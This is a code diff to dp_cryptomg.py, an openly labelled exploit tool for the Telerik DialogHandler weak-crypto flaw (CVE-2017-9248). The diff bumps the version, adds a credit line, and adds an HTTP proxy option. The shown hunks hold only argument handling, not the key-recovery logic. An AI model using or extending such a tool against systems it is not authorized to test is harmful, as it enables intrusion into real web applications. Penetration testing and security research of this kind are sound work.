@@ -10,7 +10,6 @@ import threading
 from queue import Queue
 
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
-
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 
@@ -43,9 +42,10 @@ class multiThreadHandler():
 
 def main_usage():
 
-    print("dp_cryptomg.py 0.2")
+    print("dp_cryptomg.py v1.0")
     print("Telerik DialogHandler Weak Crypto Exploit (CVE-2017-9248)")
     print("@paulmmueller\n")
+    print("Black Lantern Security - https://www.blacklanternsecurity.com/")
 
 
 # CLI arguments
@@ -60,6 +60,7 @@ if __name__ == '__main__':
     parser.add_argument('-k', '--known-key', help='The partial or complete known key, in HEX format', required = False)
     parser.add_argument('-v', '--version', help='Specify the Telerik version, if known', required = False)
     parser.add_argument('-l', '--length', help='The length of the key, if known', required = False)
+    parser.add_argument('-p', '--proxy', help='Optionally set an HTTP proxy', required = False)
 
     args = parser.parse_args()
     print(args)
@@ -98,15 +99,19 @@ if __name__ == '__main__':
     else:
         keylength = 48
 
-
     if args.version:
         version = args.version
     else:
         version = None
 
+    if args.proxy:
+        proxy = args.proxy
+    else:
+        proxy = None
+
     terminal = TerminalView()
 
-    CO = CryptOMG(debug=debug,url=args.url,handler=handler,cookie=cookie,knownkey=knownkey,version=version,length=keylength,terminal=terminal,mthlock=None)
+    CO = CryptOMG(debug=debug,url=args.url,handler=handler,cookie=cookie,knownkey=knownkey,version=version,length=keylength,proxy=proxy,terminal=terminal,mthlock=None)
     terminal.cryptomg = CO
 
     mth = multiThreadHandler(CO)
